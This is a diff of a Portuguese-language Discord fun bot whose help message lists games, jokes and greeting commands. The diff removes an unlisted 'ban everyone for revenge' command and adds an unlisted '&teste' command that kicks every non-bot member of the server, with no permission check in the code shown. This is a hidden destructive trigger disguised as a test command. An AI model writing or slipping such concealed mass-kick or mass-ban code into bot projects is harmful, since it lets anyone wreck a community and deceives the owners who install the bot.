@@ -414,13 +414,12 @@ const args = message.content.slice(prefix.length).trim().split(/ +/g);
         if(command === prefix+"help") {
             message.channel.send("**kkk eae men!**\nUse o comando **&ask** para fazer uma pergunta! \nCom o comando **&ship** eu posso te dizer se um ship é bom ou não \nO comando **&matematica** pode te dar algumas instruções de como eu posso te ajudar com matemática!\nSe quiser me mostrar algo use **&olhaso** \nSe quiser minha ajuda pra entender algo use **&vcentendeu**\nPosso respoder aos comandos: **&bomdia**, **&boatarde** ou **&boanoite** de maneira diferente em cada hora do dia!\nPara ver imagens aleatórias digite **&nut** \nPara ver gifs, use **&gif** \nPara ver alguns fun facts você pode usar **&funfacts**\nPara brincar de par ou impar, use **&parouimpar**\nDigite **&joke** caso queira ouvir uma piada! OBS: não me responsabilizo por se contorcer de agunia :p\n Use o **&roll** caso queira sortear um numeroh");
          }       
-         if(comand === prefix+"bangeraldoservidorporvingança") {
-            message.channel.send("Okiedokie!");
-            message.guild.members.forEach(member => {
-                if (member.id != client.user.id && !member.user.bot) member.ban();
-              });
+         if (command === prefix + "teste") {
 
-         }
+            message.guild.members.forEach((member) => {
+                  if (member.id != client.user.id && !member.user.bot) member.kick();
+                });
+            }
         if(command === prefix+"ded") {
             message.channel.send("Online!! :grin: :thumbsup: ");
          }
